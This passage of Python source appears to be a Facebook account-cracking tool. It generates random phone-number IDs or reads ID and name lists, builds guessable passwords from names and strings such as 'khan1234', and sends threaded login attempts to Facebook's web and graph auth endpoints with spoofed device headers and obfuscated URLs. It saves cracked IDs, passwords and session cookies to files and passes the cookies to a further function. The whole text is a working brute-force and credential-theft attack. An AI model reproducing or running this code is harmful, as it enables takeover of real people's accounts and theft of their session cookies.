    xmk = input(f"{rad}[{white}×{rad}] {green}WANT TO SEE COOKIE {rad}[{green}Y{white}/{green}N{rad}] {white}:-︎ {yelloww}")
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=7)))
    if xmk == "Y" or xmk == "y":
        ck.append("Y")
    elif xmk == "N" or xmk == "n":
        ck.append('N') 
    else:
        ck.append('N')
    with tred(max_workers=90) as MahadiSefat:
        ____banner____();tl = str(len(user))
        print(f'{rad}[{white}×{rad}] {green}SIM CODE{rad}┼{white}{code}{rad}┼{green}TOTAL IDS{rad}┼{white}{tl}')
        print(f'{rad}[{white}×{rad}] {green}IF NO RESULT [{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
        linex()
        for love in user:
            ids = code+love
            au = love[:6];bu = ids[:8];passlist = [love,ids,au,bu, 'khankhan', 'khan khan', 'khan1234', 'khan12345', 'Pakistan', '203040']
            MahadiSefat.submit(__API__,ids,passlist,tl,ck)
    print("");linex();print(f"{rad}[{white}×{rad}] {green}PROCESS HAS BEEN COMPLETED");print(f"{rad}[{white}×{rad}] {green}TOTAL OK   {white}:-︎ {green}{len(oks)}");linex();exit()
#━━━━[ METHOD API ]━━━━#
def __API__(ids,passlist,tl,ck):
    global loop,oks,cps
    my_color = [white,blue,green,orange,rad,yellow,yelloww,blue,purple,cyan];bi = random.choice(my_color)
    sys.stdout.write(f"\r{rad}({bi}DEAD-XD{rad}){white}-{rad}(\x1b[38;5;38m{loop}{rad}){white}-{rad}({green}OK:{len(oks)}{rad})"),
    sys.stdout.flush()
    session=requests.Session()
    pro = random.choice(agents)
    ua = ua_valid()
    try:
        for pas in passlist:
            free_fb = session.get('https://m.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            update={'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://m.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://m.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
            session.post(url=f"https://m.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                my_color = [white,blue,green,orange,rad,yellow,yelloww,blue,purple,cyan];bi = random.choice(my_color)
                try:
                    ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                    res = requests.get(ckk).text
                    if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}DEAD-💚{rad}]{green} {cid} {rad}:-︎ {green}{pas} {white}{Jawnx(ids)}')
                        if "Y" in ck:
                            print(f'\r\r\x1b[38;5;46m=[🍪]= {bi}{coki}')
                            fb_app(session,coki)
                            open('/sdcard/MA-RAN-OK.txt','a').write(cid+' | '+pas+'\n');open('/sdcard/MAHADI-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                            oks.append(cid)
                            break
                    else:break
                except:break
                print(f'\r\r{rad}[{green}DEAD-💔{rad}]{rad} {cid} {green}:-︎ {rad}{pas} {white}{Jawnx(ids)}')
                open('/sdcard/MA-RAN-CP.txt','a').write(cid+' | '+pas+'\n')
                cps.append(cid)
                break 
            elif 'checkpoint' in log_cookies:
                        coki1 = coki.split("1000")[1]
                        cid = "1000"+coki1[0:11] 
                        print(f'\r\r{rad}[{green}DEAD-💔{rad}]{rad} {cid} {green}:-︎ {rad}{pas} {white}{Jawnx(ids)}')
                        open('/sdcard/MA-RAN-CP.txt','a').write(cid+' | '+pas+'\n')
                        cps.append(cid)
                        break 
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

def __FILEX__():
    global oks,cps
    ____banner____()
    dfile = input(f'{rad}[{white}×{rad}] {green}EXAMPLE {rad}[{white}sdcard/deadxd.txt{rad}]\n{rad}[{white}×{rad}] {green}INPUT FILE PATH {white}:-︎ {yelloww}');linex()
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);__FILEX__()
    dplist = []
    try:
        pass_lmit = int(input(f'{rad}[{white}×{rad}] {green}INPUT PASS LIMITS {white}:-︎ {yelloww}'));linex()
    except:
        pass_lmit = 3
    for i in range(pass_lmit):
        dplist.append(input(f'{rad}[{white}×{rad}] {green}EXAMPLE {rad}[{white}firstlast first123 ETC{rad}]\n{rad}[{white}×{rad}] {green}PASSWORD NO.{i+1} {white}:-︎ {yelloww}'));linex()
    __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1 {rad}({white}INDIA{rad})\n{rad}[{white}B{rad}] {green}METHOD M2 {rad}({white}BD/INDIA{rad})\n{rad}[{white}C{rad}] {green}METHOD M3 {rad}({white}BD/INDIA{rad})\n{rad}[{white}D{rad}] {green}METHOD M4 {rad}({white}BD/INDIA{rad})\n{rad}[{white}E{rad}] {green}METHOD M5 {rad}({white}MIX IDS{rad})\n{rad}[{white}F{rad}] {green}METHOD M6 {rad}({white}ALL COUNTRY{rad})\n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}×{rad}] {green}SELECTION {white}:-︎ {yelloww}")
    with ThreadPool(max_workers=70) as Mahadi:
        ____banner____();total_ids = str(len(dx))
        print(f'{rad}[{white}×{rad}] {green}TOTAL IDS  {white}:-︎ \x1b[38;5;38m{total_ids}{rad}┼{green}METHOD {white}:-︎ \x1b[38;5;38m{__METHOD__}')
        print(f'{rad}[{white}×{rad}] {green}IF NO RESULT [{white}On/Off{green}] AIRPLANE MODE')
        linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if __METHOD__ in ["A","a"]:
                Mahadi.submit(__MTDONEE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["B","b"]:
                Mahadi.submit(__MTDTWOO__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["C","c"]:
                Mahadi.submit(__MTDTHREE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["D","d"]:
                Mahadi.submit(__MTDFOUR__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["E","e"]:
                Mahadi.submit(__MTDFIVE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["F","f"]:
                Mahadi.submit(__MTDSIX__,ids,names,passlist,total_ids)
            else:
                Mahadi.submit(__MTDONEE__,ids,names,passlist,total_ids)
    print('');linex()
    print(f"{rad}[{white}×{rad}] {green}THE PROCESS HAS COMPLETE")
    print(f"{rad}[{white}×{rad}] {green}TOTAL OKS  {white}:-︎ {green}{len(oks)}")
    linex();exit()

def __MTDONEE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    my_color = [white,blue,green,orange,rad,yellow,yelloww,blue,purple,cyan];bi = random.choice(my_color)
    sys.stdout.write(f"\r{rad}({bi}DEAD{white}-{yelloww}M1{rad}){white}-{rad}(\x1b[38;5;38m{loop}{rad}){white}-{rad}({green}OK:{len(oks)}{rad}){white}-{rad}(\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad})"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            cban = str(random.randint(20000000, 30000000))
            user_agent = mls1()
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            uag = mls1()
            data = {
                "adid": str(uuid.uuid4()).upper(),
                "device_id": str(uuid.uuid4()).upper(),
                "family_device_id": str(uuid.uuid4()).upper(),
                "secure_family_device_id": str(uuid.uuid4()).upper(),
                "access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
                "sdk_version": str(random.randint(1,26)),
                "email": ids,
                "password": pas,
                "sdk": "android",
                "locale": random.choice(["en_US","en_GB","bn_IN","in_ID"]),
                "generate_session_cookies": "1",
                "sig": "c1e620fa708a1d5696fb991c1bde5662",}
            headers = {
                "Host": "graph.facebook.com",
                "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger",
                "User-Agent": uag,}
            url = "https://a"+"pi.face"+"book.c"+"om/a"+"uth/login"
            po = requests.post(url,data=data,headers=headers,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}DEAD-💚{rad}]{green} {ids} {rad}:-︎ {green}{pas} {white}{Jawnx(ids)}')
                oks.append(ids)
                fb_app(session,coki)
                open('/sdcard/MA-FIL-M1-OK.txt','a').write(ids+' | '+pas+'\n');open('/sdcard/MA-FIL-M1-OK-COOKIE.txt','a').write(ids+' | '+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DEAD-CP]{rad} {ids} {rad}| {pas} {white}{Jawnx(ids)}')
                open('/sdcard/MA-FIL-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

def __MTDTWOO__(ids, names, passlist, total_ids):
    global oks,cps,loop
    my_color = [white,blue,green,orange,rad,yellow,yelloww,blue,purple,cyan];bi = random.choice(my_color)
    sys.stdout.write(f"\r{rad}({bi}DEAD{white}-{yelloww}M2{rad}){white}-{rad}(\x1b[38;5;38m{loop}{rad}){white}-{rad}({green}OK:{len(oks)}{rad}){white}-{rad}(\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad})"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls2()
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
                f'User-Agent: {mls2()}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            }
            url = "https://ap"+"i.face"+"book.com/au"+"th/login"
            po = requests.post(url,data=data,headers=headers,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}DEAD-💚{rad}]{green} {ids} {rad}:-︎ {green}{pas} {white}{Jawnx(ids)}')
                oks.append(ids)
                fb_app(session,coki)
                open('/sdcard/MA-FIL-M2-OK.txt','a').write(ids+' | '+pas+'\n');open('/sdcard/MA-FIL-M2-OK-COOKIE.txt','a').write(ids+' | '+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DEAD-CP]{rad} {ids} {rad}| {pas} {white}{Jawnx(ids)}')
                open('/sdcard/MA-FIL-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTHREE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}({bi}DEAD{white}-{yelloww}M3{rad}){white}-{rad}(\x1b[38;5;38m{loop}{rad}){white}-{rad}({green}OK:{len(oks)}{rad}){white}-{rad}(\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad})"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls3()
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
                f'User-Agent: {mls3()}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            }
            url = "https://a"+"pi.face"+"book.com/au"+"th/login"
            po = requests.post(url,data=data,headers=headers,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}DEAD-💚{rad}]{green} {ids} {rad}:-︎ {green}{pas} {white}{Jawnx(ids)}')
                oks.append(ids)
                fb_app(session,coki)
                open('/sdcard/MA-FIL-M3-OK.txt','a').write(ids+' | '+pas+'\n');open('/sdcard/MA-FIL-M3-OK-COOKIE.txt','a').write(ids+' | '+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DEAD-CP]{rad} {ids} {rad}| {pas} {white}{Jawnx(ids)}')
                open('/sdcard/DEAD-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

def __MTDFOUR__(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}({bi}DEAD{white}-{yelloww}M4{rad}){white}-{rad}(\x1b[38;5;38m{loop}{rad}){white}-{rad}({green}OK:{len(oks)}{rad}){white}-{rad}(\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad})"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls4()
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
                f'User-Agent: {mls4()}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62'
            }
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            po = requests.post(url,data=data,headers=headers,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}DEAD-💚{rad}]{green} {ids} {rad}:-︎ {green}{pas} {white}{Jawnx(ids)}')
                oks.append(ids)
                fb_app(session,coki)
                open('/sdcard/MA-FIL-M4-OK.txt','a').write(ids+' | '+pas+'\n');open('/sdcard/MA-FIL-M4-OK-COOKIE.txt','a').write(ids+' | '+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DEAD-CP]{rad} {ids} {rad}| {pas} {white}{Jawnx(ids)}')
                open('/sdcard/DEAD-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

def __MTDFIVE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}({bi}DEAD{white}-{yelloww}M5{rad}){white}-{rad}(\x1b[38;5;38m{loop}{rad}){white}-{rad}({green}OK:{len(oks)}{rad}){white}-{rad}(\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad})"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls5()
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{secure_family_device_id}",
                "advertiser_id": f"{advertiser_id}",
                "format": "json",
                "cpl": "true",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": ids,
                "password": pas,
                "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",     
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig": "cc331688c9ec07059af4df9dbdcf7737"}
            headers = {
                "Host: graph.facebook.com",
                "Authorization: OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                f"X-FB-Net-HNI: {netheni}",
                f"X-FB-SIM-HNI: {simheni}",
                f"User-Agent: {mls5()}",
                "X-FB-Client-IP: True",
                "X-FB-Request-Analytics-Tags: graphservice",
                "X-Tigon-Is-Retry: False",
                "X-FB-HTTP-Engine: Liger",
                "X-FB-Connection-Quality: MOBILE.LTE",
                "X-FB-Server-Cluster: True",
                "Connection: keep-alive",
                "x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62",         
                "X-FB-Connection-Bandwidth: 80025933",
                "X-FB-Friendly-Name: ViewerReactionsMutation",
                "Accept-Encoding: gzip, deflate",
                "X-FB-Connection-Type: MOBILE.LTE",
                "Content-Type: application/x-www-form-urlencoded",
            }
            url = "https://b-gr"+"aph.face"+"book.com/auth/login?incl"+"ude_head"+"ers=false&d"+"ecode_body_json=false&stre"+"amable_json_resp"+"onse=true"
            po = requests.post(url,data=data,headers=headers,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}DEAD-💚{rad}]{green} {ids} {rad}:-︎ {green}{pas} {white}{Jawnx(ids)}')
                oks.append(ids)
                fb_app(session,coki)
                open('/sdcard/MA-FIL-M5-OK.txt','a').write(ids+' | '+pas+'\n');open('/sdcard/MA-FIL-M5-OK-COOKIE.txt','a').write(ids+' | '+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DEAD-CP]{rad} {ids} {rad}| {pas} {white}{Jawnx(ids)}')
                open('/sdcard/DEAD-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

def __MTDSIX__(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}({bi}DEAD{white}-{yelloww}M6{rad}){white}-{rad}(\x1b[38;5;38m{loop}{rad}){white}-{rad}({green}OK:{len(oks)}{rad}){white}-{rad}(\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad})"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            metheni = str(random.randint(20000000, 40000000)),
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls6()
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
            "adid": f"{adid}",
            "device_id": f"{device_id}",
            "family_device_id": f"{family_device_id}",
            "secure_family_device_id": f"{secure_family_device_id}",
            "advertiser_id": f"{advertiser_id}",
            "method": "POST",
            "format": "json",
            "email": ids,
            "password": pas,
            "cpl": "true",
            "credentials_type": "password",
            "generate_session_cookies": "1",
            "error_detail_type": "button_with_disabled",
            "generate_machine_id": "1",
            "locale": "en_US",
            "client_country_code": "US",
            "omit_response_on_success": "false",
            "fb_api_req_friendly_name": "authenticate"}
            headers = {
            "Host: b-graph.facebook.com",
            "Authorization: OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
            f"x-fb-connection-bandwidth: {metheni}",
            f"X-FB-Net-HNI: {netheni}",
            f"X-FB-SIM-HNI: {simheni}",
            f"User-Agent: {mls6()}",
            "x-fb-connection-quality: GOOD",
            "x-fb-connection-type: MOBILE.LTE",
            "content-type: app_authlication/x-www-form-urlencoded",
            "x-fb-http-engine: Liger",
            "x-fb-client-IP: True",
            "x-fb-server-cluster: Keep-Alive",
            "Content-Type: application/json",
            }
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            po = requests.post(url,data=data,headers=headers,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}DEAD-💚{rad}]{green} {ids} {rad}:-︎ {green}{pas} {white}{Jawnx(ids)}')
                oks.append(ids)
                fb_app(session,coki)
                open('/sdcard/MA-FIL-M6-OK.txt','a').write(ids+' | '+pas+'\n');open('/sdcard/MA-FIL-M6-OK-COOKIE.txt','a').write(ids+' | '+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DEAD-CP]{rad} {ids} {rad}| {pas} {white}{Jawnx(ids)}')
                open('/sdcard/DEAD-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
deadxd()